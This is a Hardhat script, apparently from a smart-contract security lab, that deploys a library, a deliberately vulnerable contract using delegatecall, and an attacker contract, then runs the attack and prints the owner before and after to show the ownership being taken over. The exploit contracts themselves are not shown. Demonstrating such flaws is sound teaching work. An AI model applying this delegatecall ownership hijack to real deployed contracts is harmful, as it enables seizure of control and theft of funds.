import { ethers } from "hardhat";

async function main() {
    
    console.log("")
    const library = await ethers.getContractFactory("delegateLibrary")
    const delLibrary = await library.deploy()
    console.log(`The library to be called is deployed at ${delLibrary.target}`)

    const delegator = await ethers.deployContract("VulnDelegator", [delLibrary.target])
    await delegator.waitForDeployment()
    console.log(`The vulnerable contract that delegate calls the library is deployed at ${delegator.target}`)
    console.log("")
    console.log(`Owner of vulnerable contract is: ${await delegator.owner()}`)

    const exploit = await ethers.deployContract("AttackDel", [delegator.target])
    await exploit.waitForDeployment()

    const uintAddress = await exploit.getAddressInUint()
    await exploit.initiateAttack(uintAddress)

    console.log(`Owner of vulnerable contract after the exploit is: ${await delegator.owner()}`)
}

main().catch((error) => {
    console.error(error)
    process.exitCode=1
})